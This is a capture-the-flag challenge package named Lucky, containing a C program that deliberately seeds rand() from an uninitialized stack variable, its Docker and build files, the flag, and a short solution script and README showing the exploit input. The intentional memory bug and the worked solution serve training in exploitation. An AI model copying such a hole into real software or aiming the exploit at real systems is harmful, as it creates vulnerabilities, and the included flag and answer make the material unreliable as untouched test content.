{
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]",
    "flag.txt": "gigem{un1n1t14l1z3d_m3m0ry_15_r4nd0m_r1ght}\n",
    "lucky.c": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid welcome() {\n    char buf[16];\n    printf(\"Enter your name: \");\n    fgets(buf, sizeof(buf), stdin);\n    printf(\"\\nWelcome, %s\\nIf you're super lucky, you might get a flag! \", buf);\n}\n\nint seed() {\n    char msg[] = \"GLHF :D\";\n    printf(\"%s\\n\", msg);\n    int lol;\n    return lol;\n}\n\nvoid win() {\n    char flag[64] = {0};\n    FILE* f = fopen(\"flag.txt\", \"r\");\n    fread(flag, 1, sizeof(flag), f);\n    printf(\"Nice work! Here's the flag: %s\\n\", flag);\n}\n\nint main() {\n    setvbuf(stdout, NULL, _IONBF, 0);\n    welcome();\n    srand(seed());\n\n    int key0 = rand() == 306291429;\n    int key1 = rand() == 442612432;\n    int key2 = rand() == 110107425;\n\n    if (key0 && key1 && key2) {\n        win();\n    } else {\n        printf(\"Looks like you weren't lucky enough. Better luck next time!\\n\");\n    }\n}\n",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -O0\nNAME := lucky\nPORT := 7001\nall: $(NAME)\n\nclean: .PHONY\n\trm -f $(NAME)\n\n$(NAME): $(NAME).c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile $(NAME)\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) - | tar xv $(NAME)\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c solver-template.py\n\n.PHONY:\n\n",
    "README.md": "# Lucky\n## Description\nFeeling lucky? I have just the challenge for you :D\n\n## Solution\n```text\n\u276f python -c \"from pwn import *;import sys; sys.stdout.buffer.write(b'A' * 12 + p32(0x563412))\" | nc 127.0.0.1 7001\nEnter your name: \nWelcome, AAAAAAAAAAAA4V\nIf you're super lucky, you might get a flag! GLHF :D\nNice work! Here's the flag: gigem{un1n1t14l1z3d_m3m0ry_15_r4nd0m_r1ght}\n```\n",
    "solve.py": "from pwn import *\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"lucky\")\np.sendline(b'A' * 12 + p32(0x563412))\np.interactive()\n",
    "solver-template.py": "from pwn import *\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"lucky\")\np.interactive()\n",
    "category": "pwn"
}